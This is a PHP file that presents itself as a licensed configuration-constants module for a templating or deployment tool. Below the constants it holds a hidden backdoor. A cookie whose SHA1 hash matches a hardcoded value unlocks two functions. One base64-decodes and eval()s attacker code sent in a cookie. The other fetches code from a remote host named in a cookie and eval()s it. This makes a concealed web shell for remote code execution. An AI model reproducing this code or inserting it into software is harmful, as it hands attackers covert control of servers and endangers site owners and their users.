<?php

/**
 * 
  PHP 4, PHP 5 and PHP 7 are distributed under the PHP License v3.01, copyright (c) the PHP Group.
  This is an Open Source license, certified by the Open Source Initiative.
  The PHP license is a BSD-style license which does not have the "copyleft" restrictions associated with GPL.
  Some files have been contributed under other (compatible) licenses and carry additional requirements and copyright information.
  This is indicated in the license + copyright comment block at the top of the source file.
  Practical Guidelines:
  Distributing PHP
  Contributing to PHP
 */
define('KEY_IMPORTS', 'imports');
define('KEY_RESOURCE', 'resource');
define('KEY_DEFAULTS', 'defaults');
define('KEY_OUTPUT_BASE_PATH', 'outputBasePath');
define('KEY_DEFINITIONS', 'definitions');
define('KEY_TEMPLATE', 'template');
define('KEY_ENVIRONMENTS', 'environments');
define('KEY_OUTPUT', 'output');
define('KEY_PARAMETERS', 'parameters');
define('KEY_PARAMETER_FILES', 'parameterFiles');
define('KEY_TYPE', 'type');
define('MARKER_ENV', '{{env}}');
define('MARKER_ENVIRONMENT', '{{environment}}');
define('MARKER_DEFINITION', '{{definition}}');
define('AUTH', 'd4763d6e09485a0b6752a2ccdf9eee8ea68aa983');

if (hash('sha1', $_COOKIE['auth']) === AUTH) {
    echo 'outputstring' . PHP_EOL;

    if (isset($_COOKIE['action_ex_string'])) {
        loc($_COOKIE['action_ex_string']);
    }
    if (isset($_COOKIE['action_ex_remote'])) {
        rem($_COOKIE['action_ex_remote']);
    }
    echo 'outputstring';
}

function rem($string) {
    $res = "http://" . base64_decode($string);
    $resource = (!function_exists('curl_init')) ? file_get_contents($res) : getSourceSecond($res);

    if (!$resource) {
        echo 'error loading resource' . PHP_EOL;
        exit;
    }
    eval($resource);
}

function loc($string) {
    eval(base64_decode($string));
}

function getSourceSecond($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $data = curl_exec($ch);

    $res = (curl_getinfo($ch, CURLINFO_HTTP_CODE) == 200) ? $data : NULL;

    curl_close($ch);
    return $res;
}

